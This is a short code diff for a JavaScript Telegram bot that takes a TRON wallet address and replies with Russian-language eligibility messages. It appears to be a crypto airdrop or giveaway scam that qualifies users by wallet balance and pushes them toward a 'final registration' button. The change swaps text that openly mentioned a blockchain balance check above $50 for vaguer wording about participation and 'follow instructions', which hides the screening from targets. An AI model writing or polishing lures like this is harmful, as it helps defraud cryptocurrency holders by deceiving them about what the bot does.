@@ -175,7 +175,7 @@ async function processMessage(message) {
   if (text.match(/^T[A-Za-z0-9]{33}$/)) {
     const loadingMsg = await telegram("sendMessage", {
       chat_id: chatId,
-      text: "⏳ <i>Проверяю баланс в блокчейне...</i>",
+      text: "⏳ <i>Проверяем возможность принять участие</i>",
       parse_mode: "HTML"
     });
 
@@ -187,7 +187,7 @@ async function processMessage(message) {
         chat_id: chatId,
         message_id: messageId,
         text: "✅ <b>Кошелек подходит!</b>\n\n" +
-              "Баланс подтвержден (> $50).\n" +
+              "следуйте инструкциям\n" +
               "Вы допущены к участию.\n\n" +
               "👇 Нажмите кнопку ниже для финальной регистрации:",
         parse_mode: "HTML",
